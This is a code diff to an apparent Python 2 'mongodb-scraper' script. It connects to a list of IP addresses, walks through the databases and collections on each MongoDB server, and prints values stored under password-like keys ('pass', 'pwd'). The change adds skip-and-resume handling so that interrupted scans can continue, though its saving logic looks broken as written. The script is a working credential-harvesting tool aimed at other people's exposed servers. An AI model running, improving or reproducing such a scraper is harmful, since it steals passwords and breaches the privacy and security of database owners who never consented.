@@ -4,13 +4,20 @@ from colorlog import ColoredFormatter
 from pymongo import MongoClient
 
 
-def scrape():
+def scrape(processed):
     try:
         with open('data.json', 'r') as data_json:
             ips = json.load(data_json)
     except (IOError, ValueError):
         print "Please provide a valid JSON encoded file in data.json"
         return
+
+    try:
+        with open('processed.json', 'r') as processed_json:
+            processed = json.load(processed_json)
+    except (IOError, ValueError):
+        # Meh, I'll live with that...
+        pass
 
     mongo_logger = logging.getLogger('mongodb-scraper')
     logging.basicConfig(level=logging.DEBUG,
@@ -29,6 +36,10 @@ def scrape():
     column_names = ['pass', 'pwd']
 
     for ip in ips:
+        # Do I have already processed this IP?
+        if ip in processed:
+            continue
+
         mongo_logger.info("Connecting to " + ip)
         client = MongoClient(ip)
         dbs = client.database_names()
@@ -42,6 +53,7 @@ def scrape():
                 continue
 
             o_db = client[db]
+
             try:
                 collections = o_db.collection_names()
                 mongo_logger.info("\tFound " + str(len(collections)) + " collections")
@@ -81,11 +93,13 @@ def scrape():
                         if any(column in key for column in column_names):
                             print value
         client.close()
+        processed.append(ip)
 
 if __name__ == '__main__':
-    scrape()
-
-
-
-
-
+    try:
+        processed_list = []
+        scrape(processed_list)
+    except:
+        # Whatever happens I just want to save the processed ip, so I can resume later
+        with open('processed.json', 'w') as processed_json:
+            json.dump(processed_list, processed_json)
